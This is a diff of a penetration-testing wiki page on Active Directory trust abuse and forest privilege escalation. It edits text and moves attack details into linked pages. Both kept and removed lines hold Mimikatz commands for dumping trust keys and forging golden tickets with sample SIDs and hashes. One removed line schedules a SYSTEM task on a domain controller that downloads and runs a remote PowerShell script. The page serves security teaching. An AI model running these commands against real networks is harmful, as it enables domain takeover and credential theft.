@@ -355,7 +355,7 @@ Note that if you use wrong data, pretty ugly logs will appear.
 
 ## Forest Privilege Escalation - Domain Trusts
 
-Microsoft considers that the **domain isn't a Security Boundary**, the **Forest is the security Boundary**. This means that **if you compromise a domain inside a Forest you are going to be able to compromise the entire Forest**.
+Microsoft considers that the **domain isn't a Security Boundary**, the **Forest is the security Boundary**. This means that **if you compromise a domain inside a Forest you might be able to compromise the entire Forest**.
 
 ### Basic Information
 
@@ -372,6 +372,8 @@ When a **user** tries to **access** a **service** on the **trusting domain** it 
 
 It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.
 
+If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.
+
 A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
 
 **Different trusting relationships:**
@@ -379,7 +381,7 @@ A trust relationship can also be **transitive** (A trust B, B trust C, then A tr
 * **Parent/Child** – part of the same forest – a child domain retains an implicit two-way transitive trust with its parent. This is probably the most common type of trust that you’ll encounter.
 * **Cross-link** – aka a “shortcut trust” between child domains to improve referral times. Normally referrals in a complex forest have to filter up to the forest root and then back down to the target domain, so for a geographically spread out scenario, cross-links can make sense to cut down on authentication times.
 * **External** – an implicitly non-transitive trust created between disparate domains. “[External trusts provide access to resources in a domain outside of the forest that is not already joined by a forest trust.](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx)” External trusts enforce SID filtering, a security protection covered later in this post.
-* **Tree-root** – an implicit two-way transitive trust between the forest root domain and the new tree root you’re adding. I haven’t encountered tree-root trusts too often, but from the [Microsoft documentation](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx), they’re created when you when you create a new domain tree in a forest. These are intra-forest trusts, and they [preserve two-way transitivity](https://technet.microsoft.com/en-us/library/cc757352\(v=ws.10\).aspx) while allowing the tree to have a separate domain name (instead of child.parent.com).
+* **Tree-root** – an implicit two-way transitive trust between the forest root domain and the new tree root you’re adding. I haven’t encountered tree-root trusts too often, but from the [Microsoft documentation](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx), they’re created when you create a new domain tree in a forest. These are intra-forest trusts, and they [preserve two-way transitivity](https://technet.microsoft.com/en-us/library/cc757352\(v=ws.10\).aspx) while allowing the tree to have a separate domain name (instead of child.parent.com).
 * **Forest** – a transitive trust between one forest root domain and another forest root domain. Forest trusts also enforce SID filtering.
 * **MIT** – a trust with a non-Windows [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain. I hope to dive more into MIT trusts in the future.
 
@@ -398,48 +400,37 @@ There are three **main** ways that security principals (users/groups/computer) f
 
 ### Child-to-Parent forest privilege escalation
 
-#### SID-History Injection
+```
+Get-DomainTrust
 
-Also, notice that there are **2 trusted keys**, one for _Child --> Parent_ and another one for P\_arent --> Child\_.
+SourceName      : sub.domain.local    --> current domain
+TargetName      : domain.local        --> foreign domain
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
+TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
+WhenCreated     : 2/19/2021 1:28:00 PM
+WhenChanged     : 2/19/2021 1:28:00 PM
+```
+
+{% hint style="warning" %}
+There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
+You can the one used by the current domain them with:
 
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 ```
+{% endhint %}
 
-```bash
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
-/domain:<Current domain>
-/sid:<SID of current domain>
-/sids:<SID of the Enterprise Admins group of the parent domain>
-/rc4:<Trusted key>
-/user:Administrator
-/service:<target service>
-/target:<Other domain>
-/ticket:C:\path\save\ticket.kirbi
-```
+#### SID-History Injection
 
-For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in S-1-5-21\_root domain\_-519. For example, from root domain SID _S-1-5-21-280534878-1496970234-700767426_ the "Enterprise Admins"group SID is _S-1-5-21-280534878-1496970234-700767426-519_
+Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:
 
-[http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
+{% content-ref url="sid-history-injection.md" %}
+[sid-history-injection.md](sid-history-injection.md)
+{% endcontent-ref %}
 
-```bash
-.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
- .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
- ls \\mcorp-dc.moneycorp.local\c$
-```
-
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
-
-```bash
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
-Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
-gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local
-schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
-schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
-```
-
-#### Exploit writeable Configration NC
+#### Exploit writeable Configuration NC
 
 The Configuration NC is the primary repository for configuration information for a forest and is replicated to every DC in the forest. Additionally, every writable DC (not read-only DCs) in the forest holds a writable copy of the Configuration NC. Exploiting this require running as SYSTEM on a (child) DC.
 
@@ -450,13 +441,13 @@ It is possible to compromise the root domain in various ways. Examples:
 * [Schema attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)
 * Exploit ADCS - Create/modify certificate template to allow authentication as any user (e.g. Enterprise Admins)
 
-### External Forest Domain Privilege escalation
+### External Forest Domain - One-Way (Inbound)
 
-In this case you can **sign with** the **trusted** key a **TGT impersonating** the **Administrator** user of the current domain. In this case you **won't always get Domain Admins privileges in the external domain**, but **only** the privileges the Administrator user of your current domain **was given** in the external domain.
+In this scenario **your domain is trusted** by an external one giving you **undetermined permissions** over it. You will need to find **which principals of your domain have which access over the external domain** and then try to exploit it:
 
-```bash
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
-```
+{% content-ref url="external-forest-domain-oneway-inbound.md" %}
+[external-forest-domain-oneway-inbound.md](external-forest-domain-oneway-inbound.md)
+{% endcontent-ref %}
 
 ### Attack one-way trusted domain/forest (Trust account attack)
 
@@ -540,6 +531,10 @@ If you don't execute this from a Domain Controller, ATA is going to catch you, s
 * [Powershell script to do domain auditing automation](https://github.com/phillips321/adaudit)
 * [Python script to enumerate active directory](https://github.com/ropnop/windapsearch)
 * [Python script to enumerate active directory](https://github.com/CroweCybersecurity/ad-ldap-enum)
+
+## References
+
+* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
 
 <details>
 
